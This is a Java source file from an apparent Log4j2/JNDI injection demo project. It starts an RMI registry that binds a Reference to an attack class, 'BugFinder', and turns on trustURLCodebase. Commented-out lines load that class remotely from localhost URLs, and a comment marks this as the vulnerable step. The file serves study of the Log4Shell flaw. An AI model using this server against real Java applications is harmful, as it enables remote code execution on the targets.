package com.wrh.jndidemo;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author wuruohong
 * @Classname RmiServer
 * @Description 服务绑定并启动监听
 * @Date 2021/12/14 10:52
 */
public class RmiServer {
    public static void main(String[] args) throws Exception{
        //System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
       /* Registry registry = LocateRegistry.createRegistry(1099);
        System.out.println("RMI启动， 监听：1099端口");
        registry.bind("hello", new MyRmiServiceImpl());
        Thread.currentThread().join();*/

        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");  // 这个在java版本高的时候使用
        Registry registry = LocateRegistry.createRegistry(1099);
        System.out.println("RMI启动，监听：1099 端口");
        /**
         * 绑定的Reference涉及三个变量：
         * className：远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载；
         * classFactory：远程的工厂类；
         * classFactoryLocation：工厂类加载的地址，可以是file://、ftp://、http:// 等协议；
         */
        //Reference reference = new Reference("Calc", "Calc", "http://127.0.0.1:8000/");
        // 这一句就是漏洞所在 攻击类和下载web地址
        //Reference reference = new Reference("com.wrh.jndidemo.BugFinder", "com.wrh.jndidemo.BugFinder", "http://127.0.0.1:9988/BugFinder.class");
        //  下面用来模拟log4j2
        Reference reference = new Reference("com.wrh.jndidemo.BugFinder", "com.wrh.jndidemo.BugFinder", null);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("hello", referenceWrapper);

        Thread.currentThread().join();

    }
}
